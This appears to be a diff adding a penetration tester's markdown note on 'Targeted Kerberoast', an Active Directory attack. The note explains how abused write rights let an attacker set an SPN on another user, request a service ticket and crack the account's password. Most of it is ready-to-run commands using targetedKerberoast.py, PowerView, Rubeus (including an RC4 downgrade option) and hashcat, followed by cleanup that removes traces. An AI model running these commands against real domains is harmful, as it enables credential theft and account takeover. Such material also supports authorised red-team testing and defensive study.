@@ -1,0 +1,148 @@
+---
+Primary_category: "[[DACL ABUSE]]"
+title: "TARGETED KERBEROAST"
+draft: false
+banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+banner_y: 0.88286
+tags:
+cssclasses:
+---
+
+###### PRIMARY CATEGORY → [[DACL ABUSE]]&nbsp;&nbsp;•&nbsp;&nbsp;[[KERBEROAST]]
+
+With this attack, the idea is the same as with *[[KERBEROASTING|Kerberoasting]]*
+
+Any authenticated user can request a *Service Ticket (ST)* for a registered *Service Principal Name (SPN)* to the *Ticket Granting Service (TGS)*
+
+This *service ticket* will be encrypted with a key derived from the password for which the given *SPN* is registered. The *TGS* will respond with a *TGS_REP* containing that *service ticket* and an *encrypted part*
+
+An operator can obtain a crackable hash from the issued *service ticket* and try to crack it in order to obtain the plain password for the related *service account*
+
+On *Targeted Kerberoast*, an attacker controls an account which has **`GenericAll`**, **`GenericWrite`**, **`WriteProperty`** or **`Validated-SPN`** over another domain account
+
+Then, it leverages any of these rights to add an *SPN* attribute to the target account. Once the *SPN* is added, it automatically becomes susceptible for *Kerberoasting*
+
+Once a *service ticket* is requested for the registered *SPN*, the latter should be deleted from the *target account*
+
+---
+
+#### *Abuse - UNIX-like*
+
+##### *TargetedKerberoast.py*
+
+> ***[TargetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast)***
+
+###### *Setup*
+
+```bash
+git clone https://github.com/ShutdownRepo/targetedKerberoast targetedKerberoast
+```
+
+```bash
+cd !$ && python3 -m venv .venv
+. !$/bin/activate && pip3 install -r requirements.txt
+```
+
+###### *Usage*
+
+> ***Subsequent Cleanup is performed automatically***
+
+```bash
+python3 targetedKerberoast.py --verbose --dc-ip '<DC>' --domain '<DOMAIN>' --user '<USER>' --password '<PASSWD>' --request-user '<TARGET_USER>' --output-file <OUTPUT_FILE>
+```
+
+> [!DANGER]- *e.g.*
+>
+> *User A* has *GenericWrite* over *User B* and leverages this right to set a temporal *SPN* to *User B* in order to request a *Service Ticket* for that *SPN* and crack the resulting hash
+>
+> ```bash
+> python3 targetedKerberoast.py --verbose --dc-ip 'dc.domain.local' --domain 'domain.local' --user 'userA' --password 'password1234$!' --request-user 'userB' --output-file userB.hash
+> ```
+>
+
+Next, the received hash can be cracked as follows with ***[Hashcat](https://github.com/hashcat/hashcat)***
+
+> ***RC4_HMAC_MD5 Hashcat Type → 13100***
+
+```bash
+hashcat --force -O --attack-mode 0 --hash-type 13100 <HASH> <WORDLIST>
+```
+
+---
+
+#### *Abuse - Windows*
+
+##### *Powerview*
+
+> ***[Powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)***
+
+###### *Checking that the Target Account has no SPNs*
+
+> ***Get-DomainUser***
+
+```bash
+Get-DomainUser -Identity '<USER>' | Select-Object servicePrincipalName
+```
+
+###### *Setting a certain SPN to the Target User Account*
+
+> ***Set-DomainObject***
+
+```powershell
+$passwd = ConvertTo-SecureString -AsPlainText -Force -String '<PASSWD>'
+```
+
+```powershell
+$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $passwd)
+```
+
+```powershell
+Set-DomainObject -Credential $cred -Identity '<USER>' -Set @{ servicePrincipalName = '<SPN>' } -Verbose
+```
+
+###### *Requesting a Service Ticket for the given SPN*
+
+- ***Powerview***
+
+> ***Get-DomainSPNTicket***
+
+```powershell
+Get-DomainUser -Identity '<USER>' | Get-DomainSPNTicket | fl
+```
+
+- ***Rubeus***
+
+> ***[Rubeus](https://github.com/GhostPack/Rubeus)***
+
+```powershell
+.\Rubeus.exe kerberoast /user:<USER> /nowrap
+```
+
+> [!INFO]- *Info*
+>
+> If *AES* encryption flags are enabled in the *UserAccountControl* attribute of the target account and any of the existent *DCs* is a *Windows Server 2016* or below, simply use the **`/tgtdeleg`** option to ensure *downgrade encryption* and receive a *service ticket* encrypted-signed with *RC4_HMAC_MD5*
+>
+> ```powershell
+> .\Rubeus.exe kerberoast /user:<USER> /tgtdeleg /nowrap
+> ```
+>
+
+###### *Cracking the Kerberoasting Hash*
+
+> ***[Hashcat](https://github.com/hashcat/hashcat)***
+
+> ***RC4_HMAC_MD5 Hashcat Type → 13100***
+
+```bash
+hashcat --force -O --attack-mode 0 --hash-type 13100 <HASH> <WORDLIST>
+```
+
+###### *SPN Cleanup*
+
+> ***Remove the SPN assigned to the target account***
+
+> ***Set-DomainObject***
+
+```powershell
+Set-DomainObject -Credential $cred -Identity '<USER>' -Clear servicePrincipalName -Verbose
+```
